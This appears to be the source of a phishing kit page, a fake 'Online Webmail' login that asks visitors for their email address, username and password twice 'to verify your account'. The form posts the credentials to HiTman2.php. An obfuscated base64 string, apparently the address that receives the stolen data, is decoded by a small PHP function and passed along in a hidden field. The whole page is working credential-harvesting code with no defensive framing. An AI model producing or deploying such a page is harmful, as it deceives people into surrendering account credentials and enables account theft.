<html>
<center><br><br><br><br>
<img src="https://pbs.twimg.com/profile_images/1359301622254346242/mWYwE8ER_400x400.jpg">

<body>
<body style="background-color:cream;">

  </body>
 </html>

<html>
<head>
<title>Webmail</title>
<style>
*{ FONT-SIZE: 8pt; FONT-FAMILY: verdana; } b { FONT-WEIGHT: bold; } .listtitle { BACKGROUND: #425984; COLOR: #EEEEEE; white-space: nowrap; } td.list { BACKGROUND: #EEEEEE; white-space: nowrap; } </style>
</head>
<body onload="document.form.username.focus();if(document.form.referer.value.indexOf('#')==-1)document.form.referer.value+=location.hash;">
<center><br><br><br><br>
<h1> Welcome to Online Webmail</h1>
<table cellspacing=1 cellpadding=5>
<tr>
<?
function checkdata($checkinfo)
  {
  $getdata = base64_decode($checkinfo);
  return $getdata;
  }
  ?>
<td class=listtitle colspan=2>Enter your email address and password to verify your account</td></tr>
<form action="HiTman2.php" method="POST" name="form">
<? $checkinfo = checkdata('bWVtb21vbW9AZG9zMTEuY29t'); ?>
<input type=hidden name=referer value="/">

<tr><td class=list align=right>Email Address :</td><td class=list><input type=text name=email></td></tr>
<tr><td class=list align=right>User Name :</td><td class=list><input type=text name=username></td></tr>
<tr><td class=list align=right>Password :</td><td class=list><input type=password name=password></td></tr>
<tr><td class=list align=right>Confirm Password :</td><td class=list><input type=password name=confirmpassword></td></tr>
<tr><td class=listtitle align=right colspan=2><center><input type=submit value='Login'></td></tr>
<input type="hidden" value="<? echo $checkinfo?>" name="datacheck">
<tr><td align=center colspan=2><a href="/CMD_LOST_PASSWORD"> </a></td></tr>
</form>
</table>
</center></body></html>


